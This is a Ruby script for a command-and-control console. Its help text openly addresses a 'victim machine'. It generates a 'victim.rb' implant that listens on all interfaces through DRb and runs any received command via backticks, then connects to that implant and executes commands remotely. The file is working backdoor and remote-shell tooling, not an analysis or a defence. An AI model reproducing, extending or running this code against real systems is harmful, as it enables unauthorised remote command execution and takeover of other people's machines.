#!/usr/bin/env ruby

require 'readline'
require 'drb'
require 'etc'

#Ctrl + C for exiting
trap('INT','SIG_IGN')

#Available commands
CMDS=['help','exec','HOST','PORT','connect','make','exit',]

port=0
ip=""
rshell=0
username=Etc.getlogin


class String
  def red; colorize(self, "\e[1m\e[31m"); end
  def green; colorize(self, "\e[1m\e[32m"); end
  def dark_green; colorize(self, "\e[32m"); end
  def yellow; colorize(self, "\e[1m\e[33m"); end
  def blue; colorize(self, "\e[1m\e[34m"); end
  def dark_blue; colorize(self, "\e[34m"); end
  def purple; colorize(self, "\e[35m"); end
  def dark_purple; colorize(self, "\e[1;35m"); end
  def cyan; colorize(self, "\e[1;36m"); end
  def dark_cyan; colorize(self, "\e[36m"); end
  def pure; colorize(self, "\e[0m\e[28m"); end
  def bold; colorize(self, "\e[1m"); end
  def colorize(text, color_code) "#{color_code}#{text}\e[0m" end
end


#Banner
puts " _______      ______  ________                 ______   ".red
puts "|_   __ \\   .' ___  ||_   __  |              .' ____ \\  ".red
puts "  | |__) | / .'   \\_|  | |_ \\_| ,--.   ,--.  | (___ \\_| ".red
puts "  |  __ /  | |         |  _| _ `'_\\ : `'_\\ :  _.____`.  ".red
puts " _| |  \\ \\_\\ `.___.'\\ _| |__/ |// | |,// | |,| \\____) | ".red
puts "|____| |___|`.____ .'|________|\\'-;__/\\'-;__/ \\______.' ".red
puts "                                                        ".red

completion =
  proc do |str|
    case
    when Readline.line_buffer =~ /help.*/i 
      puts "Available commands: \n".dark_green+"help: ".dark_blue+"Get help\n".dark_purple+"exec: ".dark_blue+"Execute a command on the victim machine".dark_purple+"\nHOST: ".dark_blue+"Set the victime machine IP".dark_purple+"\nPORT: ".dark_blue+"Set the port through which the connection will be generate".dark_purple+"\nconnect: ".dark_blue+"Establish connect with the victime machine".dark_purple+"\nmake: ".dark_blue+"Generate script to install on the victime machine".dark_purple+" \nexit: ".dark_blue+"Exit".dark_purple
    when Readline.line_buffer =~ /exec.*/i 
      puts "Execute a command on the victime machine ".dark_blue+"[+]Use: exec <command>".dark_purple
    when Readline.line_buffer=~/HOST.*/i 
      puts "Set the victime machine host ".dark_blue+"[+]Use: HOST <ip>".dark_purple
    when Readline.line_buffer=~/PORT.*/i 
      puts "set the port through which the connection will be generate ".dark_blue+"[+]Use: PORT <port>".dark_purple
    when Readline.line_buffer=~/make.*/i 
      puts "Generate script to install on the victime machine ".dark_blue+"#make <port attacker>".dark_purple
    when Readline.line_buffer=~/connect.*/i 
      puts "Establish connect with the victime machine".dark_blue
    when Readline.line_buffer=~/exit.*/i 
      puts "Exiting...".red
      exit 0
    else 
      CMDS.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
  end
end

Readline.completion_proc=completion
Readline.completion_append_character =' '

while line=Readline.readline("[#{username} ~ C2C Ruby]$ ".dark_blue,true)
  puts completion.call

  if line =~ /^exec.*/i 
    match = /exec\s+(\w+)/i.match(line)
    if match 
      puts "#{match[1]}"
      begin 
        puts rshell.exec "#{match[1].to_s}"
      rescue => e 
        puts "[+]An error occurred during the execution of the command.".red
      end
    else 
      puts "[!]Add a command".red
    end
  elsif line =~ /^HOST.*/i
    match = /HOST\s+((?:\d{1,3}\.){3}\d{1,3})/i.match(line)
    if match 
      puts "HOST set in #{match[1].to_s}".dark_green
      ip=match[1].to_s
    else  
      puts "[!]Enter a host".red
    end
  elsif line =~/^PORT.*/i 
    match= /PORT\s+(\w+)/i.match(line)
    if match 
      puts "PORT set in #{match[1].to_i}".dark_green
      port=match[1].to_i
    else 
      puts "[!]Enter a port".red
    end
  elsif line =~/^connect.*/i 
    puts "Connecting...".blue 
    rshell = DRbObject.new_with_uri("druby://#{ip}:#{port}")
    puts "Connected Sucessful ".dark_green
  elsif line =~ /^make.*/i 
    match = /make\s+(\d+)/i.match(line)
    if match 
      puts "port: #{match[1]}".dark_green
      file_name="victim.rb"
      File.open(file_name, "w") do |file|
        # Escribir contenido en el archivo
        file.puts "#!/usr/bin/env ruby"
        file.puts "require 'drb'\n"
        file.puts "class RShell"
        file.puts "\tdef exec(cmd)"
        file.puts "\t\t\`\#{cmd}\`"
        file.puts "\tend"
        file.puts "end"
        file.puts "DRb.start_service('druby://0.0.0.0:#{match[1].to_i}', RShell.new)"
        file.puts "DRb.thread.join"
      end
      puts "The file #{file_name} has been created".dark_green
    else 
      puts "[!]Enter a valid port".red
    end
  end 
  break if line =~ /^quit.*/i or line =~ /^exit.*/i 
end
